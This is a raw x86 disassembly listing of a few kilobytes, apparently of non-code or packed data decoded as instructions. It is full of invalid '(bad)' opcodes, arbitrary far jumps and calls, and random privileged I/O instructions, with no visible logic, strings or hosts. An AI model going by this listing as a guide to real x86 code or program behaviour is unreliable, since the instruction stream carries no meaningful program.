  427f17:	lock sub ecx,edx
  427f1a:	aam    0x18
  427f1c:	test   esi,ebx
  427f1e:	imul   edi,DWORD PTR [ecx-0x32],0x44
  427f22:	push   ebx
  427f23:	adc    BYTE PTR [edx-0x32ee0a8],0x1a
  427f2a:	daa    
  427f2b:	sbb    dh,BYTE PTR [ebx+eax*4]
  427f2e:	retf   0x4dd6
  427f31:	mov    edx,0xd73162eb
  427f36:	add    ah,0x58
  427f39:	sbb    bl,BYTE PTR [edi-0xa]
  427f3c:	retf   
  427f3d:	test   dh,ah
  427f3f:	(bad)  
  427f40:	clc    
  427f41:	scas   eax,DWORD PTR es:[edi]
  427f42:	jmp    0xc88c:0x4e1144a8
  427f49:	rep stos DWORD PTR es:[edi],eax
  427f4b:	sbb    eax,0xbb90b2e8
  427f50:	fst    DWORD PTR [ecx+edi*2-0x59]
  427f54:	ret    0xf9a6
  427f57:	xor    edx,DWORD PTR [eax-0x7]
  427f5a:	mov    esi,0xe1a71063
  427f5f:	sbb    BYTE PTR [ecx-0x3d],al
  427f62:	inc    edi
  427f63:	adc    eax,0x12483a90
  427f68:	lods   eax,DWORD PTR ds:[esi]
  427f69:	xchg   ebp,eax
  427f6a:	add    al,0xe6
  427f6c:	les    esp,FWORD PTR [ecx+0x7ebc6242]
  427f72:	imul   esi,DWORD PTR [esi-0x64],0xffffffed
  427f76:	mov    edx,0x2e587fa8
  427f7b:	(bad)  
  427f7c:	or     eax,DWORD PTR [ebx+0x15]
  427f7f:	cli    
  427f80:	cmp    edi,eax
  427f82:	xor    eax,0xca48b231
  427f87:	test   al,0x31
  427f89:	(bad)  
  427f8a:	pop    edi
  427f8b:	call   0x3188:0xdf09260e
  427f92:	(bad)  
  427f93:	scas   al,BYTE PTR es:[edi]
  427f94:	fld    st(6)
  427f96:	mov    eax,0x13f4859a
  427f9b:	inc    esp
  427f9c:	aaa    
  427f9d:	(bad)  
  427f9e:	in     eax,0xf7
  427fa0:	mov    bl,0xe2
  427fa2:	ins    DWORD PTR es:[edi],dx
  427fa3:	hlt    
  427fa4:	cmp    edx,esi
  427fa6:	fimul  DWORD PTR [edi-0x43]
  427fa9:	out    0x6b,al
  427fab:	mov    esi,0xf3dfb9fa
  427fb0:	sub    al,0xeb
  427fb2:	rol    BYTE PTR [esi+0x63],cl
  427fb5:	fidivr WORD PTR ds:0xcac02004
  427fbb:	add    eax,0x3c5fe583
  427fc0:	inc    eax
  427fc1:	inc    edi
  427fc2:	ret    
  427fc3:	fst    DWORD PTR [esi]
  427fc5:	jmp    0xa669:0x6e7af98
  427fcc:	unpckhps xmm1,xmm7
  427fcf:	(bad)  
  427fd0:	cmp    BYTE PTR [edi],dl
  427fd2:	sub    al,0x89
  427fd4:	je     0x42802a
  427fd6:	scas   al,BYTE PTR es:[edi]
  427fd7:	mov    ch,0x24
  427fd9:	add    eax,0xc12bc0df
  427fde:	sbb    al,0xfb
  427fe0:	pushf  
  427fe1:	dec    eax
  427fe2:	data16 add BYTE PTR [ecx],al
  427fe5:	inc    edi
  427fe6:	das    
  427fe7:	mov    ah,BYTE PTR [ebx+0x9]
  427fea:	stos   BYTE PTR es:[edi],al
  427feb:	pop    esp
  427fec:	int3   
  427fed:	and    eax,DWORD PTR [eax]
	...
  428053:	add    BYTE PTR [eax],al
  428055:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	mov    esp,0x671fd1b3
  428067:	lods   eax,DWORD PTR ds:[esi]
  428068:	add    DWORD PTR [eax],eax
  42806a:	add    BYTE PTR [ecx],al
  42806c:	add    BYTE PTR [eax],al
  42806e:	xchg   DWORD PTR [edi+0x12f6fb98],ebp
  428074:	add    BYTE PTR [ebp+0x5512af5f],0x76
  42807b:	xor    ebp,DWORD PTR [edi]
  42807d:	sbb    bl,BYTE PTR [edi-0x380bd46a]
  428083:	call   0x266a6152
  428088:	xor    eax,ecx
  42808a:	dec    ebp
  42808b:	cmp    DWORD PTR [edx-0x38c492a4],ebp
  428091:	xchg   edi,eax
  428092:	test   al,0x61
  428094:	out    0xe8,eax
  428096:	icebp  
  428097:	test   eax,edi
  428099:	out    dx,eax
  42809a:	sahf   
  42809b:	retf   0x9ddf
  42809e:	jecxz  0x428101
  4280a0:	int    0xa8
  4280a2:	pop    esi
  4280a3:	stc    
  4280a4:	push   esi
  4280a5:	push   edx
  4280a6:	dec    ebp
  4280a7:	jle    0x4280f4
  4280a9:	and    BYTE PTR [eax+0x553e657b],bh
  4280af:	(bad)  
  4280b0:	mov    ds:0xbb300e3f,al
  4280b5:	jg     0x428106
  4280b7:	inc    esp
  4280b8:	mov    ecx,0xfec5107c
  4280bd:	cdq    
  4280be:	call   0x33d5ecce
  4280c3:	cmp    DWORD PTR [eax+0x39516a6f],edx
  4280c9:	rcr    dl,0xc6
  4280cc:	mul    edi
  4280ce:	jbe    0x428092
  4280d0:	popa   
  4280d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280d2:	aas    
  4280d3:	xchg   edx,eax
  4280d4:	(bad)  
  4280d5:	cmp    DWORD PTR [esi-0x535ab140],eax
  4280db:	frstor [ebx]
  4280dd:	into   
  4280de:	clc    
  4280df:	mov    ch,0x9b
  4280e1:	sar    BYTE PTR [bx+di],cl
  4280e4:	fcom   QWORD PTR [ebp-0x44706600]
  4280ea:	adc    ah,ch
  4280ec:	aas    
  4280ed:	cmp    al,0xc
  4280ef:	js     0x42816c
  4280f1:	outs   dx,DWORD PTR ds:[esi]
  4280f2:	adc    ch,BYTE PTR [edx]
  4280f4:	adc    esi,ebx
  4280f6:	ja     0x428116
  4280f8:	out    dx,eax
  4280f9:	fcomip st,st(5)
  4280fb:	aas    
  4280fc:	enter  0x8e93,0xac
  428100:	ins    DWORD PTR es:[di],dx
  428102:	aaa    
  428103:	fdiv   DWORD PTR [ebx]
  428105:	dec    esp
  428106:	repz and al,dl
  428109:	push   edx
  42810a:	ud1    edx,DWORD PTR [edx-0x49]
  42810e:	add    esi,DWORD PTR [edi]
  428110:	cmc    
  428111:	dec    esi
  428112:	repz shl BYTE PTR [esi+0x2e7fb9a8],cl
  428119:	test   al,0x7a
  42811b:	scas   al,BYTE PTR es:[edi]
  42811c:	test   BYTE PTR [ebx+0x79],ah
  42811f:	mov    ecx,DWORD PTR [esi]
  428121:	sbb    DWORD PTR [eax+0x6c],esi
  428124:	inc    esp
  428125:	pop    ds
  428126:	and    eax,0xad480535
  42812b:	shr    BYTE PTR [ecx+0x14296345],1
  428131:	seta   BYTE PTR [edx+0x57]
  428135:	jbe    0x428174
  428137:	test   al,0x8f
  428139:	cmc    
  42813a:	xchg   BYTE PTR [ebp-0x131f20d6],dh
  428140:	dec    ebx
  428141:	lea    ecx,[bp+di]
  428144:	popa   
  428145:	add    DWORD PTR [eax-0x3e139125],ebp
  42814b:	mov    ds:0xcd1233ff,al
  428150:	pop    esi
  428151:	jmp    0x40fc47b8
  428156:	fwait
  428157:	inc    esi
  428158:	test   BYTE PTR [ebx-0x22],dl
  42815b:	aam    0xe3
  42815d:	es out dx,eax
  42815f:	jo     0x4280e8
  428161:	xor    ah,bh
  428163:	dec    ebp
  428164:	js     0x4281a6
  428166:	pop    ebp
  428167:	jnp    0x4281ac
  428169:	das    
  42816a:	repnz mov al,ds:0x92ca
	...
  4281d4:	add    BYTE PTR [eax],al
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	mov    dl,0x77
  4281e4:	pop    ss
  4281e5:	push   ds
  4281e6:	scas   al,BYTE PTR es:[di]
  4281e8:	add    DWORD PTR [eax],eax
  4281ea:	add    BYTE PTR [ecx],al
  4281ec:	add    BYTE PTR [eax],al
  4281ee:	adc    BYTE PTR [edi],bh
  4281f0:	push   esp
  4281f1:	mov    edx,0x55044c3d
  4281f6:	xchg   edi,eax
  4281f7:	adc    dl,BYTE PTR [ebx-0x47655790]
  4281fd:	sub    al,0x64
  4281ff:	dec    ecx
  428200:	jbe    0x42819a
  428202:	aas    
  428203:	jmp    0x6bf55933
  428208:	dec    ecx
  428209:	lock jae 0x428201
  42820c:	lahf   
  42820d:	test   eax,edi
  42820f:	xchg   esi,eax
  428210:	ins    DWORD PTR es:[edi],dx
  428211:	ds push edx
  428213:	dec    ebp
  428214:	inc    esp
  428215:	imul   ebp,DWORD PTR [edi+0x1b],0x73d65d7
  42821c:	jp     0x4281cc
  42821e:	(bad)  
  42821f:	adc    esp,edi
  428221:	xor    edi,DWORD PTR [edi]
  428223:	jno    0x4282a4
  428225:	out    0x11,eax
  428227:	sub    al,BYTE PTR [esi]
  428229:	inc    ebp
  42822a:	das    
  42822b:	sub    al,0x14
  42822d:	mov    esi,0x2c46a157
  428232:	push   edx
  428233:	gs into 
  428235:	mov    DWORD PTR [eax],0x7144637e
  42823b:	inc    ebx
  42823c:	xchg   edx,eax
  42823d:	in     al,0x45
  42823f:	test   eax,0x4195ea5e
  428244:	cmp    edi,DWORD PTR [ebp+0x9]
  428247:	jne    0x4282b9
  428249:	jae    0x4281e8
  42824b:	push   esp
  42824c:	inc    edi
  42824d:	aaa    
  42824e:	mov    edx,0x37164f69
  428253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428254:	push   ebx
  428255:	push   esp
  428256:	or     DWORD PTR [eax],0x926a828a
  42825c:	push   esi
  42825d:	dec    esp
  42825e:	adc    BYTE PTR [edi-0x11],dl
  428261:	inc    ebp
  428262:	rol    BYTE PTR [esi],1
  428264:	xor    eax,0x835f7d1c
  428269:	pop    esi
  42826a:	les    edx,FWORD PTR [edi-0x67]
  42826d:	ret    0xfee4
  428270:	je     0x4282a3
  428272:	pop    esp
  428273:	dec    esp
  428274:	stos   DWORD PTR es:[edi],eax
  428275:	dec    edx
  428276:	ror    BYTE PTR [ecx],0xa1
  428279:	inc    esp
  42827a:	scas   eax,DWORD PTR es:[edi]
  42827b:	xchg   edx,eax
  42827c:	pop    ebx
  42827d:	int3   
  42827e:	fld    TBYTE PTR [esi-0x3bf98b82]
  428284:	or     BYTE PTR [ebx],dl
  428286:	push   ebp
  428287:	(bad)  
  428288:	out    0xb0,al
  42828a:	adc    BYTE PTR [esi],bl
  42828c:	aad    0xcb
  42828e:	je     0x42821c
  428290:	mov    ecx,0x535e4f7d
  428295:	shr    al,1
  428297:	push   cs
  428298:	push   0xffffffcf
  42829a:	lods   eax,DWORD PTR ds:[esi]
  42829b:	pop    ss
  42829c:	shl    BYTE PTR [esp+ebp*2+0x555625bd],0x7e
  4282a4:	and    BYTE PTR [bp+di],al
  4282a7:	jmp    0x4282e4
  4282a9:	ins    BYTE PTR es:[edi],dx
  4282aa:	jo     0x42823b
  4282ac:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282ae:	xlat   BYTE PTR ds:[ebx]
  4282af:	stos   BYTE PTR es:[edi],al
  4282b0:	push   ebp
  4282b1:	out    0x8a,al
  4282b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282b4:	mov    esi,0x6e96b691
  4282b9:	aaa    
  4282ba:	dec    ebx
  4282bb:	push   edx
  4282bc:	in     eax,dx
  4282bd:	in     al,0xb2
  4282bf:	adc    al,0x67
  4282c1:	sbb    al,0x1
  4282c3:	sbb    al,0x2a
  4282c5:	fcomp  DWORD PTR [eax-0x75]
  4282c8:	mov    cl,0x25
  4282ca:	xchg   ebx,eax
  4282cb:	jmp    FWORD PTR [eax+0x6a]
  4282ce:	jl     0x428267
  4282d0:	add    ecx,DWORD PTR [esi-0x52]
  4282d3:	jne    0x42828b
  4282d5:	adc    BYTE PTR [ecx-0x20],ch
  4282d8:	ret    0x17a1
  4282db:	test   al,0x53
  4282dd:	dec    edi
  4282de:	shl    DWORD PTR [esp+ecx*2-0x28a5b360],1
  4282e5:	call   0xd046:0xe1d1c9
  4282ec:	adc    al,BYTE PTR ds:[eax]
	...
  428353:	add    BYTE PTR [eax],al
  428355:	add    bh,al
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	xchg   edi,eax
  428363:	cmp    ecx,ebx
  428365:	push   ebp
  428366:	scas   eax,DWORD PTR es:[di]
  428368:	add    DWORD PTR [eax],eax
  42836a:	add    BYTE PTR [ecx],al
  42836c:	add    BYTE PTR [eax],al
  42836e:	dec    ecx
  42836f:	jbe    0x428335
  428371:	mov    cl,0x1d
  428373:	cmp    eax,0xb3e3b770
  428378:	xchg   DWORD PTR [edx],eax
  42837a:	test   eax,0x57ba244b
  42837f:	xchg   edi,eax
  428380:	ror    ebx,cl
  428382:	or     al,0xdf
  428384:	sbb    DWORD PTR [esp+ebp*1+0x51],ebx
  428388:	aaa    
  428389:	cmp    BYTE PTR [eax],dh
  42838b:	rcl    ecx,1
  42838d:	outs   dx,DWORD PTR ds:[esi]
  42838e:	stos   DWORD PTR es:[edi],eax
  42838f:	ret    
  428390:	arpl   WORD PTR [ebx-0x58],cx
  428393:	xchg   edx,eax
  428394:	(bad)  
  428395:	mov    edi,0xdeb9df7e
  42839a:	test   al,0xab
  42839c:	inc    ecx
  42839d:	(bad)  
  42839e:	jmp    0x4283bc
  4283a0:	aad    0xf3
  4283a2:	div    BYTE PTR [ecx+0x6c32f47]
  4283a8:	fldenv [edx-0x3a8da3f5]
  4283ae:	mov    bl,0xdd
  4283b0:	ds mov dh,0x98
  4283b3:	call   0x93e5:0xcb7e18d1
  4283ba:	pushf  
  4283bb:	imul   ebx,edi,0x2c
  4283be:	xor    BYTE PTR [esi+0x47c63f71],al
  4283c4:	enter  0xa2cf,0xd6
  4283c8:	mov    gs,WORD PTR [esi]
  4283ca:	inc    esi
  4283cb:	inc    bl
  4283cd:	inc    edx
  4283ce:	mov    ah,0xb4
  4283d0:	bound  esi,QWORD PTR [eax+0x1a]
  4283d3:	fist   DWORD PTR [ebp-0x38]
  4283d6:	mov    al,0x16
  4283d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283d9:	in     al,0x76
  4283db:	dec    ebp
  4283dc:	push   cs
  4283dd:	pop    esi
  4283de:	mov    ch,0x39
  4283e0:	pusha  
  4283e1:	xlat   BYTE PTR gs:[ebx]
  4283e3:	je     0x4283d0
  4283e5:	neg    BYTE PTR [ebp+0x63]
  4283e8:	jge    0x428408
  4283ea:	adc    eax,0x9511b41d
  4283ef:	jbe    0x42839c
  4283f1:	retf   
  4283f2:	or     al,0xeb
  4283f4:	pop    ds
  4283f5:	sti    
  4283f6:	jae    0x428411
  4283f8:	jb     0x42843a
  4283fa:	pop    ds
  4283fb:	leave  
  4283fc:	out    dx,eax
  4283fd:	mov    dl,0x87
  4283ff:	out    dx,eax
  428400:	inc    ecx
  428401:	cs into 
  428403:	repnz inc ebx
  428405:	sub    esi,edx
  428407:	stc    
  428408:	cwde   
  428409:	xchg   edi,eax
  42840a:	in     al,0x31
  42840c:	inc    ebp
  42840d:	push   ds
  42840e:	and    edi,edi
  428410:	in     al,0xe6
  428412:	cmp    DWORD PTR es:[ecx+0x6e],0xffffffa4
  428417:	daa    
  428418:	xlat   BYTE PTR ds:[ebx]
  428419:	cmp    eax,DWORD PTR [ecx+ebx*1-0x5de0c8d4]
  428420:	out    dx,eax
  428421:	dec    BYTE PTR [ecx]
  428423:	fiadd  WORD PTR [edx+edi*8]
  428426:	int3   
  428427:	loop   0x4284a3
  428429:	fst    QWORD PTR [ecx+0xa8be3e9]
  42842f:	jae    0x42845e
  428431:	cli    
  428432:	cmp    BYTE PTR [ebp-0x6f],0x10
  428436:	scas   al,BYTE PTR es:[edi]
  428437:	(bad)  
  428438:	mov    eax,0xec27bf73
  42843d:	dec    esp
  42843e:	pushf  
  42843f:	fsubr  st,st(1)
  428441:	ret    0xbb9c
  428444:	jne    0x4283d0
  428446:	mov    esp,0x25ef8b8
  42844b:	ins    BYTE PTR es:[edi],dx
  42844c:	mov    ebx,0xb14c6c9d
  428451:	pop    eax
  428452:	call   0x74b7f921
  428457:	pop    ecx
  428459:	cmp    BYTE PTR [esi],al
  42845b:	test   BYTE PTR [ebx-0x3b],0x90
  42845f:	(bad)  
  428460:	cld    
  428461:	and    esp,DWORD PTR [esi-0x778b04d8]
  428467:	outs   dx,BYTE PTR ds:[esi]
  428468:	pusha  
  428469:	jno    0x4284e9
  42846b:	inc    esi
  42846c:	pop    edi
  42846d:	mov    DWORD PTR [eax],eax
	...
  4284d3:	add    BYTE PTR [eax],al
  4284d5:	add    BYTE PTR [esi],cl
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0x25abfb32
  4284e3:	sub    DWORD PTR cs:[ebp+0x67],edi
  4284e7:	mov    al,0x1
  4284e9:	add    BYTE PTR [eax],al
  4284eb:	add    DWORD PTR [eax],eax
  4284ed:	add    BYTE PTR [ebp-0x18],ch
  4284f0:	jl     0x42849c
  4284f2:	or     ch,cl
  4284f4:	jb     0x4284b7
  4284f6:	mov    DWORD PTR [esp+eiz*4+0x18c64237],eax
  4284fd:	lds    ebx,FWORD PTR [edx-0x13]
  428500:	xor    BYTE PTR [ebp-0x41b2f145],0x48
  428507:	pop    ebp
  428508:	add    DWORD PTR [esi],ecx
  42850a:	xchg   ecx,eax
  42850b:	mov    ebx,0x41a160f9
  428510:	js     0x4284b6
  428512:	push   ecx
  428513:	mov    ebx,DWORD PTR [ebp+0x563e0900]
  428519:	iret   
  42851a:	push   edi
  42851b:	pop    edi
  42851c:	repnz or dl,0x6e
  428520:	(bad)  
  428521:	test   bl,0xe6
  428524:	or     BYTE PTR cs:[eax+ebp*2],ch
  428528:	mov    dh,0x4c
  42852a:	dec    edi
  42852b:	jmp    0x2ca5a58e
  428530:	inc    edi
  428531:	adc    esi,DWORD PTR [ecx+eiz*8-0x7d8b2dd3]
  428538:	mov    ds:0xccaa0761,al
  42853d:	or     dh,BYTE PTR [ecx]
  42853f:	iret   
  428540:	mov    dh,BYTE PTR [esi]
  428542:	jle    0x428562
  428544:	popf   
  428545:	lods   al,BYTE PTR ds:[esi]
  428546:	sbb    eax,0x40ee4bc
  42854b:	adc    WORD PTR [edx-0x46],dx
  42854f:	scas   eax,DWORD PTR es:[edi]
  428550:	mov    ch,0x11
  428552:	ret    
  428553:	int    0x34
  428555:	bound  edx,QWORD PTR [ebx+0x2e88eb0d]
  42855b:	mov    eax,ds:0x95456d7b
  428560:	pmaddwd mm5,QWORD PTR [ecx]
  428563:	sub    al,0x8e
  428565:	and    esi,DWORD PTR [ebp+0xbda1fbc]
  42856b:	aas    
  42856c:	fsubr  QWORD PTR [esi]
  42856e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  428570:	popa   
  428571:	call   0x174ff540
  428576:	lock inc edi
  428578:	inc    edx
  428579:	xlat   BYTE PTR ds:[ebx]
  42857a:	and    eax,0xe862c027
  42857f:	jmp    0xea24:0x251f8cde
  428586:	mov    ecx,0x1f631dfd
  42858b:	push   ecx
  42858c:	ret    
  42858d:	adc    eax,0x8214e859
  428592:	les    ebp,FWORD PTR ds:0x2e59e09b
  428598:	ins    BYTE PTR es:[edi],dx
  428599:	jnp    0x428584
  42859b:	add    dh,BYTE PTR [esi-0xafedc05]
  4285a1:	xor    DWORD PTR [eax],edx
  4285a3:	test   eax,0x29bb40de
  4285a8:	das    
  4285a9:	fwait
  4285aa:	mov    cx,0xc130
  4285ae:	ja     0x42854b
  4285b0:	jno    0x428613
  4285b2:	mov    DWORD PTR [eax-0x12fb6d60],ebp
  4285b8:	inc    ebp
  4285b9:	(bad)  
  4285ba:	cld    
  4285bb:	call   0xfdb9:0x2b522bc3
  4285c2:	jmp    0xb36e:0xc9ae316b
  4285c9:	sub    ebp,DWORD PTR [edx]
  4285cb:	jb     0x42858d
  4285cd:	inc    edx
  4285ce:	int3   
  4285cf:	and    al,BYTE PTR [ecx-0x202dda88]
  4285d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4285d6:	pop    ebp
  4285d7:	xor    DWORD PTR [edx+0x72],edx
  4285da:	xchg   ecx,eax
  4285db:	dec    esp
  4285dc:	dec    edi
  4285dd:	dec    cl
  4285df:	out    0x96,eax
  4285e1:	outs   dx,DWORD PTR ds:[esi]
  4285e2:	out    dx,eax
  4285e3:	sbb    al,0x4c
  4285e5:	scas   eax,DWORD PTR es:[edi]
  4285e6:	cwde   
  4285e7:	cmc    
  4285e8:	cmp    eax,0xcaa9d0cf
  4285ed:	mov    edx,0x0
	...
  428656:	push   ecx
  428657:	div    BYTE PTR ds:0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0xcc71a3f6
  428664:	inc    eax
  428665:	mov    ebp,0x1b167
  42866a:	add    BYTE PTR [ecx],al
  42866c:	add    BYTE PTR [eax],al
  42866e:	mov    DWORD PTR [esp+ebp*1+0x69],ebx
  428672:	daa    
  428673:	adc    BYTE PTR [ebx+0x18],0xa
  428677:	loop   0x428697
  428679:	jg     0xaf223d98
  42867f:	call   FWORD PTR [edi+ecx*8-0x63dc3be5]
  428686:	in     eax,0x4c
  428688:	out    0x84,eax
  42868a:	xchg   BYTE PTR [ebx-0x34],ch
  42868d:	scas   al,BYTE PTR es:[edi]
  42868e:	jecxz  0x42861f
  428690:	shl    bh,0x7b
  428693:	inc    eax
  428694:	push   esp
  428695:	push   ss
  428696:	xor    DWORD PTR [edx+0x1f59abd1],edi
  42869c:	add    ebp,DWORD PTR [esi]
  42869e:	call   0x101f:0x5ea29ff7
  4286a5:	push   esi
  4286a6:	(bad)  
  4286a9:	xchg   ebx,eax
  4286aa:	aam    0xf
  4286ac:	mov    al,ds:0x1e3369f2
  4286b1:	jmp    0x4301:0xa90d985b
  4286b8:	jns    0x428697
  4286ba:	pop    ecx
  4286bb:	pop    eax
  4286bc:	ja     0x4286b2
  4286be:	popf   
  4286bf:	int    0x11
  4286c1:	mov    edx,0xca49e61c
  4286c6:	fcmovnb st,st(1)
  4286c8:	loop   0x42872f
  4286ca:	sub    BYTE PTR [esi-0x568dc265],bh
  4286d0:	loope  0x4286f1
  4286d2:	dec    ebp
  4286d3:	mov    al,0xc7
  4286d5:	xchg   ecx,eax
  4286d6:	dec    esi
  4286d7:	mov    ch,0x4d
  4286d9:	and    DWORD PTR [eax],0xffffffb6
  4286dc:	push   edx
  4286dd:	push   edx
  4286de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4286e0:	inc    ebp
  4286e1:	sbb    edi,esp
  4286e3:	pop    ebx
  4286e4:	ret    
  4286e5:	add    BYTE PTR [ecx],bl
  4286e7:	jne    0x428682
  4286e9:	jmp    0xcc3cddd1
  4286ee:	pop    ds
  4286ef:	jo     0x4286b4
  4286f1:	(bad)  
  4286f2:	lods   al,BYTE PTR ds:[esi]
  4286f3:	cmp    al,0x94
  4286f5:	sbb    eax,0xadd601a7
  4286fa:	gs inc ebp
  4286fc:	push   es
  4286fd:	aad    0x24
  4286ff:	xchg   ebp,eax
  428700:	fs add eax,0x5e8e2e6e
  428706:	cmp    BYTE PTR [eax],0x41
  428709:	std    
  42870a:	sbb    ah,0x32
  42870d:	dec    edi
  42870e:	fincstp 
  428710:	imul   eax,DWORD PTR [ebp+0x6d],0xffffff9e
  428714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428715:	push   esi
  428716:	cmp    eax,0xebbfed69
  42871b:	or     DWORD PTR [ebx+0x2a],0x7f
  42871f:	xchg   esp,eax
  428720:	retf   
  428721:	inc    esp
  428722:	jg     0x42877a
  428724:	lock aas 
  428726:	push   eax
  428727:	nop
  428728:	inc    ecx
  428729:	(bad)  
  42872a:	jmp    0x4286f1
  42872c:	push   DWORD PTR [edx]
  42872e:	mov    edi,DWORD PTR [edi+0x5bb74ccb]
  428734:	push   ebx
  428735:	push   edx
  428736:	push   ds
  428737:	out    dx,eax
  428738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428739:	outs   dx,DWORD PTR ds:[esi]
  42873a:	pop    edx
  42873b:	call   FWORD PTR [ecx-0xa]
  42873e:	mov    esi,0x6c4b1198
  428743:	adc    esi,DWORD PTR [ebx+0xa]
  428746:	push   edi
  428747:	dec    ecx
  428748:	lods   eax,DWORD PTR ds:[esi]
  428749:	cmp    eax,0xe34fc45c
  42874e:	dec    esi
  42874f:	jg     0x428783
  428751:	daa    
  428752:	leave  
  428753:	jae    0x4287a4
  428755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428756:	jo     0x4287b7
  428758:	lahf   
  428759:	and    dl,ah
  42875b:	sub    cl,BYTE PTR [ecx]
  42875d:	mov    ecx,0x45856155
  428762:	in     al,0x66
  428764:	or     ebp,DWORD PTR [ecx+0x58ac832a]
  42876a:	rol    BYTE PTR [edx+0x76],1
  42876d:	mov    es,WORD PTR [eax]
	...
  4287d3:	add    BYTE PTR [eax],al
  4287d5:	add    BYTE PTR [esi+0x5b],dl
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0x737c7bf8
  4287e5:	xchg   esi,eax
  4287e6:	addr16 mov dl,0x1
  4287e9:	add    BYTE PTR [eax],al
  4287eb:	add    DWORD PTR [eax],eax
  4287ed:	add    BYTE PTR [ebx],dh
  4287ef:	loop   0x428836
  4287f1:	mov    ?,WORD PTR [ebx]
  4287f3:	inc    ebx
  4287f4:	mov    dh,0xe
  4287f6:	dec    ebx
  4287f7:	sub    eax,0x5f9ad514
  4287fc:	jne    0x42884f
  4287fe:	inc    ebx
  4287ff:	jnp    0x4287ba
  428801:	fidiv  WORD PTR [edi+0x79]
  428804:	das    
  428805:	mov    dl,0x24
  428807:	std    
  428808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428809:	dec    ebx
  42880a:	jns    0x42885b
  42880c:	add    al,0x5a
  42880e:	mov    ebx,0x197a2f83
  428813:	rol    BYTE PTR [ebx-0x701bc6af],0x2e
  42881a:	mov    ds:0x3d91048c,al
  42881f:	jg     0x4287a5
  428821:	adc    bl,BYTE PTR [eax-0x77dd44ee]
  428827:	sub    ah,BYTE PTR [edi-0x4e]
  42882a:	push   cs
  42882b:	jbe    0x4287ad
  42882d:	adc    bh,BYTE PTR [ecx+edi*1]
  428830:	out    dx,eax
  428831:	dec    esi
  428832:	sub    eax,0xa9adf0e9
  428837:	add    ebp,DWORD PTR [ecx]
  428839:	addr16 or edx,eax
  42883c:	or     dl,BYTE PTR [ebp-0xb2f5c81]
  428842:	stc    
  428843:	dec    ebp
  428844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428845:	outs   dx,DWORD PTR ds:[esi]
  428846:	pop    edi
  428847:	jmp    0x42884b
  428849:	loop   0x42884f
  42884b:	add    DWORD PTR [eax-0x4155891b],edx
  428851:	pop    ecx
  428852:	pop    esi
  428853:	jmp    DWORD PTR ds:0x81e3a5b4
  428859:	push   ebp
  42885a:	jge    0x428824
  42885c:	cwde   
  42885d:	mov    eax,DWORD PTR [ebp-0x79]
  428860:	repnz loopne 0x4288e1
  428863:	jle    0x428803
  428865:	cmp    ebx,DWORD PTR [ecx-0x3a]
  428868:	xor    cl,BYTE PTR [ecx+ecx*1-0x264ec509]
  42886f:	(bad)  [ecx-0x28]
  428872:	mov    DWORD PTR ds:0x3bcfa42e,eax
  428878:	add    ebp,eax
  42887a:	inc    edi
  42887b:	mov    bh,BYTE PTR [edx]
  42887d:	xchg   esp,eax
  42887e:	xor    DWORD PTR [eax+eiz*1+0x76],ecx
  428882:	leave  
  428883:	or     eax,DWORD PTR [esi-0x5f]
  428886:	iret   
  428887:	call   0x1b8637fc
  42888c:	add    BYTE PTR [esi],cl
  42888e:	sti    
  42888f:	int3   
  428890:	ss jecxz 0x4288bc
  428893:	ret    0xc6a7
  428896:	mov    eax,ebx
  428898:	in     al,dx
  428899:	iret   
  42889a:	dec    edx
  42889b:	push   esp
  42889c:	mov    eax,ds:0x149f6045
  4288a1:	jae    0x4288f7
  4288a3:	aad    0x34
  4288a5:	mov    edi,0xa707d0b8
  4288aa:	mov    cl,0xdc
  4288ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4288ad:	add    esp,0x50
  4288b0:	add    al,0x4
  4288b2:	xor    al,0x2c
  4288b4:	sub    eax,0xf07ad381
  4288b9:	inc    edx
  4288ba:	bound  edi,QWORD PTR gs:[ecx-0x31bf1b16]
  4288c1:	xchg   ebp,eax
  4288c2:	push   cs
  4288c3:	mov    dh,0x80
  4288c5:	or     BYTE PTR [esi+0x76],dh
  4288c8:	into   
  4288c9:	cmc    
  4288ca:	jbe    0x42893a
  4288cc:	lahf   
  4288cd:	aam    0xd6
  4288cf:	xor    ah,BYTE PTR [ebp+0x29]
  4288d2:	mov    bh,0xd3
  4288d4:	fld    DWORD PTR [esi]
  4288d6:	push   ss
  4288d7:	mov    eax,ds:0x5a0ecb81
  4288dc:	mov    edi,0x510f44c3
  4288e1:	add    BYTE PTR [edx-0x5443d1b2],ch
  4288e7:	jmp    DWORD PTR [ebp-0x7187a24a]
  4288ed:	leave  
	...
  428956:	es jp  0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi-0x25d462f1],bx
  428964:	push   0xffffffce
